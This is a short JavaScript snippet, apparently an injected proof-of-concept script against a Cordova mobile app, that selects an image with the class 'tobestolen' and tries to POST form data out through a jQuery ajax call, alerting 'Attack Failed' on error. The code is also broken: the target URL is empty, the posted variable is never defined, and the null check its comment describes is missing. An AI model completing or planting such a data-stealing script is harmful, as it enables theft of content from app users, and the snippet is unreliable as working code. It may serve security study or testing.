<script>
	var result = null;
	try {

		result = document.querySelector("img.tobestolen");
		//Post data only of result != null
		$.ajax({
			url:'',
			type:"POST",
			data:formData,
			contentType:"application/x-www-form"
		})

	}catch(err){
		alert('Attack Failed '+'COrdova failed: probably not runnig on a mobile device ',10000);

	}
</script>